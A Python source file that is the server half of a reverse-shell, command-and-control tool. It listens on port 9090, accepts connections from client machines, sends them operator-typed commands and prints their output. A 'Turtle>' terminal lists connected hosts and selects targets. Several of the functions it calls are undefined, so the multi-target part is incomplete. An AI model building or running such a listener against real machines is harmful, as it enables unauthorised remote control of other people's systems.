# -*- coding: utf-8 -*-
# @Author: prateek
# @Date:   2020-10-07 23:55:25
# @Last Modified by:   prateek
# @Last Modified time: 2020-10-08 00:18:35

# Server file

import socket 
import sys
import threading
import time
from queue import Queue

NUM_THREADS=2
JOB_NUMBER = [1,2]   # 1 stands for connection and 2 stands for sending commands
all_connections = []
all_address = []

# Create a socket to join two componenets
def create_socket():
	try :
		global host
		global port
		global s 

		host=""
		port = 9090
		s = socket.socket()
	except socket.error as msg:
		print('Error in creating socket '+str(msg))

# Binding the socket and listening for connections

def bind_socket():
	try :
		global host;
		global port;
		global s;

		print('Binding the Port : '+str(port))

		s.bind((host,port))
		s.listen(5)

	except socket.error as msg:
		print('Error in binding socket '+str(msg) +'\n' + 'Retrying ...\n')
		bind_socket()


def send_command(conn):
	
	while True:
		cmd = input()
		if cmd == 'quit':
			conn.close()
			s.close()
			sys.exit()
		if len(str.encode(cmd)) > 0 :
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024),'utf-8')
			print(client_response + '\n',end = "")




# Establish the connection with the client 
def accept_conn():
	

	conn,addr = s.accept()
	print('Connection has been established with IP Address : '+str(addr[0] + " with Port Number : "+str(addr[1])))
	send_command(conn)


	conn.close()

# Handling connections from multiple clients
# CLosing all previous connections when server is restarted

def accept_connection():
	for c in all_connections:
		c.close()

	del all_connections[:]
	del all_address[:]

	while True : 
		try :
			conn,address = s.accept()
			s.setblocking(1) #prevents timeout
			all_connections.append(conn)
			all_address.append(address)

			print('Connection has been established '+ str(address[0]))

		except :
			print('Error accepting connection')	


# Creating Custom Terminal

def start_turtle() :
	cmd = input('Turtle> ')

	if cmd == 'list':
		list_connection()
	elif 'select' in cmd :
		conn = get_target(cmd)

		if conn is not None :
			send_target_commands(conn)
	else:
		print('Command not recognized')





def main():
	create_socket()
	bind_socket()
	accept_conn()

main()

